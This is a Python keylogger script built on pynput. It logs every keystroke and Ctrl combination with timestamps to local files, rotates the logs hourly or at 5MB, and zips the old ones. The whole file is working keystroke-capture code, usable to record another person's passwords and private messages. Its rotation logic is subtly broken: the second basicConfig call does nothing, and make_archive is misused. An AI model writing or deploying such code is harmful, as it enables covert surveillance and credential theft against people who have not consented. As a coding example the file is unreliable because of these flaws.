import os
import logging
import time
import shutil
from pynput import keyboard
from datetime import datetime
import threading

# Configuration
LOG_FILE_SIZE_LIMIT = 5 * 1024 * 1024  # 5MB limit for each log file
LOG_DIR = "logs"  # Directory where logs will be saved
COMPRESS_LOGS = True  # Whether to compress old logs into .zip files
LOG_RESET_INTERVAL = 3600  # Log reset interval in seconds (1 hour is the dfefault)

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def get_new_log_filename():
    """Generate a new log file name with a timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    return os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
log_filename = get_new_log_filename()
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s - %(message)s", encoding='utf-8')

pressed_keys = set()

def on_press(key):
    try:
        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pressed_keys.add('ctrl')
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            pressed_keys.add('shift')
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            pressed_keys.add('alt')
        else:
            if 'ctrl' in pressed_keys:
                # FIX FOR CTRL+KEY ERROR: Try to get the vk to find the actual letter
                if hasattr(key, 'vk') and 96 < key.vk < 123: # a-z range
                     char = chr(key.vk).upper()
                elif hasattr(key, 'char'):
                     # If char is a low ASCII control code (1-26), map it back to a-z
                     if ord(key.char) <= 26:
                         char = chr(ord(key.char) + 64) # 1 becomes 'A'
                     else:
                         char = key.char
                else:
                     char = str(key)
                
                logging.info(f"Ctrl + {char} pressed")
            
            elif 'shift' in pressed_keys and key == keyboard.Key.enter:
                logging.info("Shift + Enter pressed")
            else:
                logging.info(f"Key pressed: {key.char if hasattr(key, 'char') else key}")

    except AttributeError:
        logging.info(f"Special key pressed: {key}")
    except Exception as e:
        logging.error(f"Error logging key: {e}")

    # Check if the log file exceeds the size limit
    if os.path.getsize(log_filename) > LOG_FILE_SIZE_LIMIT:
        logging.info(f"Log file exceeded 5MB, creating a new log file.")
        rotate_logs()

def on_release(key):
    """Stops the listener when the escape key is pressed and removes the modifier keys."""
    if key == keyboard.Key.esc:
        logging.info("Keylogger stopped.")
        return False
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pressed_keys.discard('ctrl')
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        pressed_keys.discard('shift')
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        pressed_keys.discard('alt')

def rotate_logs():
    """Handles log file rotation and compression."""
    global log_filename
    if COMPRESS_LOGS:
        compress_log(log_filename)

    # Create a new log file
    log_filename = get_new_log_filename()
    logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s - %(message)s")
    logging.info("Starting new log file.")

def compress_log(filename):
    """Compress the log file into a .zip archive."""
    compressed_filename = filename + ".zip"
    shutil.make_archive(compressed_filename, 'zip', LOG_DIR, filename)
    os.remove(filename)
    print(f"Compressed and removed {filename}")

def periodic_reset():
    """Periodically resets the log file."""
    while True:
        time.sleep(LOG_RESET_INTERVAL)
        rotate_logs()
        logging.info("Log file reset.")

reset_thread = threading.Thread(target=periodic_reset, daemon=True)
reset_thread.start()
logging.info("Keylogger started.")

# Set up the listener to monitor keyboard input
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
